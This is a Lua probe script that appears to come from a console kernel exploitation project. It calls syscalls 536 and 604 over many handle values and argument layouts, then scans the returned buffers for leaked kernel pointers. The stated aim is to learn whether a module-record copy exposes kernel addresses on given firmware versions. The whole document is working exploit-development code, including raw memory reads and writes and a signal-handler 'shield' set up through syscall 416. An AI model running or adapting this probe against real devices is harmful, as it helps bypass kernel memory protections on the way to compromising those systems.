-- CRASH_CLASS: MODERATE
-- PROBE 1037a: sys 536 dl_get_info / 604 dl_get_metadata copy a 0xa58-byte module
-- record to userland (13.60 kptr_hunt OBJECT copyout at rax+0x88). The record has a
-- name[0x80], a handle at +0x80 and field_88 at +0x88. If field_88 or anything else
-- in the record is a kernel pointer, this is a leak. 13.60 gates 536 on three
-- credential predicates; shape coverage here is what decides whether the 14.10 copy
-- is reachable at all.
print("=== PROBE 1037a ===")
local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function A(x) return uint64(string.format("0x%X", to_num(x))) end
local function as_addr(x) local m=tostring(x):match("0x(%x+)"); if m then return tonumber(m,16) end return to_num(x) end
local function hi_of(q) if type(q)=="table" and q.h then return q.h, q.l end return 0, to_num(q) end
local function make_syscall(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rq(addr) local ok,v=pcall(function() return memory.read_qword(addr) end) if ok then return v end return nil end
local function rd(addr) local ok,v=pcall(function() return memory.read_dword(addr) end) if ok then return to_num(v) end return -1 end
local function wq(addr,val) pcall(function() memory.write_qword(addr,val) end) end
local function wd(addr,val) pcall(function() memory.write_dword(addr,val) end) end

local SENT = 0xCCCCCCCC   -- exactly representable; 0xCCCCCCCCCCCCCCCC rounds above 2^53
local act=memory.alloc(0x28); local aa=as_addr(act)
for o=0,0x20,8 do wd(aa+o,0) end
wd(aa,1)
local sc_sig=make_syscall(416)
local okS,vS=pcall(function() return sc_sig(uint64(12), uint64(aa), uint64(0)) end)
print(string.format("[S] shield ok=%s rv=%s", tostring(okS), okS and tostring(to_num(vS)) or "-"))

local mypid=to_num(make_syscall(20)(uint64(0),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)))
print("[P] pid="..mypid)

local BUF=0x1000
local buf=memory.alloc(BUF+0x100)
local ba=as_addr(buf)
local function zero() for i=0,BUF/8-1 do wq(ba+i*8,SENT) end end
local function scan(tag)
  local kp=0; local first=""; local touched=0
  for i=0,BUF/8-1 do
    local vq=rq(ba+i*8)
    local v = vq and to_num(vq) or nil
    if v and v~=SENT then
      touched=touched+1
      local h,l=hi_of(vq)
      if h>=0xFFFF8000 and not (l==0xFFFFFFFF and h==0xFFFFFFFF) then
        kp=kp+1
        if kp<=4 then first=first..string.format(" +%X=%X_%08X", i*8, h, l) end
      end
    end
  end
  if touched>0 then
    local h80,l80 = hi_of(rq(ba+0x80))
    local h88,l88 = hi_of(rq(ba+0x88))
    print(string.format("[%s] touched=%d kp=%d%s q80=%X_%08X q88=%X_%08X name=%02X%02X%02X%02X",
      tag, touched, kp, first, h80, l80, h88, l88, rd(ba), rd(ba+4), rd(ba+8), rd(ba+0xC)))
  end
end

local handles={0,1,2,3,4,5,6,7,8,13,22,32,34,36,38,0x8E,0x2001,0x3A,0x41,0x9F,0xA0,0x8D,0xA2,0x48,0x4A,0x42}
local function call(tag, num, a1, a2, a3)
  zero()
  local sc=make_syscall(num)
  local ok,v=pcall(function() return sc(A(a1), A(a2), A(a3), A(0), A(0), A(0)) end)
  local rv = ok and to_num(v) or -999
  print(string.format("[%s] rv=%s", tag, tostring(rv)))
  scan(tag)
end

print("-- shape A: 536(pid, handle, buf)")
for _,h in ipairs(handles) do call(string.format("536A h=%X",h), 536, mypid, h, ba) end

print("-- shape B: 536(handle, buf, len)")
for _,h in ipairs({0,2,0x8E,0x2001}) do call(string.format("536B h=%X",h), 536, h, ba, 0xA58) end

print("-- shape C: 604(handle, buf, len)")
for _,h in ipairs(handles) do call(string.format("604C h=%X",h), 604, h, ba, 0xA58) end

print("-- shape D: 604(pid, handle, buf)")
for _,h in ipairs({0,2,0x8E,0x2001}) do call(string.format("604D h=%X",h), 604, mypid, h, ba) end

print("[Z] done pid="..mypid)
